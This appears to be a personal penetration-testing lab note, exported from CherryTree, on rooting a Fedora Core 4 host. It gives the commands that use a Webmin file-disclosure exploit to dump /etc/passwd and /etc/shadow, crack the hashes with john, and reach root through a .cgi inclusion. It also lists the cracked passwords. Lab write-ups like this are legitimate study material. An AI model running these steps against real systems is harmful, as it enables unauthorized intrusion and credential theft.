<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.11.1.141 FC4 rooted</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.11.1.141 FC4 rooted</h1><br/>nmap showed that 22, 111, 10000 were all open. <br />10000 was running a webserver with webmin.<br />searchsploit webmin showed an arbitrary file disclosure.<br /><a href=""><img src="images/1060-1.png" alt="images/1060-1.png" /></a><br /><br />useing the php one I was able to dump /etc/passwd<br />    php -f 1997.php 10.11.1.141 10000 http /etc/passwd<br />I was also able to dump /etc/shadow<br />with /etc/shadow and /etc/passwd I was able to copy paste the output to files and run unshadow.<br />unshadow 141passwd 141shadow &gt; 141hash<br />john --wordlist=/Yeet/Tools/Wordlists/rockyou.txt 141hash<br />I now have the creds<br />    alice:loading1<br />    bob:BUGZBUNNY<br /><br />sshing in was a huge pain becasue I was getting the error<br />    Unable to negotiate with 10.11.1.141 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1<br />the fix was to run<br />    ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 alice@10.11.1.141<br />    <br />By all reasonable thoughts, the machine should be vulnerable to a kernel exploit, but alas, it is not.<br /><br />Fortunatley, the webserver is running as root. (We know this because we were able to dump /etc/shadow and /root/proof.txt).<br />Often whatever file extension the webserver is running as (in this case CGI) will execute as that language (in this case .pl) if you LFI to a .cgi file.<br /><br />php -f 1997.php 10.11.1.141 10000 http /tmp/3232.cgi<br />rooted!<br /><br /><br /><br /><br /><br />8aafac90ff1c985236b1593e84709fb0</div></body></html>